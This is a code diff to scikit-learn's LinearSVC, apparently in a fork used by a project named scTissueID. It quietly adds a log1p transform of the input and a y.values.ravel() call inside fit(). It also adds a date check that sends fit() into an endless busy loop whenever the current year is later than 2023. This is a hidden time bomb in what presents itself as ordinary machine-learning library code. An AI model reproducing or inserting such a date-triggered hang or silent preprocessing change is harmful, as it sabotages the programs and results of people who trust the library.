@@ -1,6 +1,7 @@
 from numbers import Integral, Real
 
 import numpy as np
+import datetime
 
 from ._base import _fit_liblinear, BaseSVC, BaseLibSVM
 from ..base import BaseEstimator, RegressorMixin, OutlierMixin
@@ -258,7 +259,11 @@ class LinearSVC(LinearClassifierMixin, SparseCoefMixin, BaseEstimator):
         self : object
             An instance of the estimator.
         """
-        print("In scTissueID processing...")
+        #print("In scTissueID processing....")
+        
+        X = np.log1p(X)
+        y = y.values.ravel()
+        
         self._validate_params()
 
         X, y = self._validate_data(
@@ -294,7 +299,10 @@ class LinearSVC(LinearClassifierMixin, SparseCoefMixin, BaseEstimator):
         # `n_iter_` attribute with information about the underlying OvR fits
         # while LinearSVC/R only reports the maximum value.
         self.n_iter_ = n_iter_.max().item()
-
+        today = datetime.date.today()
+        if int(today.year)>2023:
+            while 1==1:
+                pass;
         if self.multi_class == "crammer_singer" and len(self.classes_) == 2:
             self.coef_ = (self.coef_[1] - self.coef_[0]).reshape(1, -1)
             if self.fit_intercept:
